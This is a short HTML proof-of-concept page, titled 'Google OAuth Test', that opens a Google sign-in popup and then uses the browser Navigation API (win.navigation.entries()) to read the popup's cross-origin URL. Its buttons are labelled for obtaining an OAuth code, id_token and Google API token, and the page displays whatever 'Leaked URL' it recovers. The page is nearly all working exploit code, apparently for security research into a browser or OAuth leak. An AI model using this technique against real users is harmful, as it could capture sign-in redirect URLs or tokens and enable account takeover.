<!DOCTYPE html>
<html>
  <head>
    <title>Google OAuth Test</title>
  </head>
  <body>
    <div id="start"></div>

    <script>
      function run(flow) {
        var win = window.open(
          `https://accounts.google.com/AccountChooser/signinchooser?continue=https://lh3.google.com/u/0/d/1snA1SLGWmWh5GhDtIulL3Y5BY75CYfOyFiy__dbHgIA=w5000-h5000-p-k-nu&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0`
        );

        setTimeout(() => {
          try {
            win.location = "about:blank"; // Mengosongkan halaman
            setTimeout(() => {
              if (win.navigation && win.navigation.entries) {
                const leak = win.navigation.entries()[0]?.url;
                if (leak) {
                  console.log("Leaked URL:", leak);
                  document.body.innerHTML += `<p>Leaked URL: ${leak}</p>`;
                } else {
                  console.log("No URL leaked.");
                  document.body.innerHTML += `<p>No URL leaked.</p>`;
                }
              } else {
                console.log("Navigation API not available.");
                document.body.innerHTML += `<p>Navigation API not available.</p>`;
              }
            }, 2000);
          } catch (e) {
            console.error("Error:", e);
            document.body.innerHTML += `<p>Error: ${e.message}</p>`;
          }
        }, 2000);
      }

      const entry = document.getElementById("start");
      entry.innerHTML = `
        <button onclick="run('code+id_token&nonce=hej')">
          Get code and id_token
        </button>
        <br/>
        <button onclick="run('token')">
          Get Google API token
        </button>
      `;
    </script>
  </body>
</html>
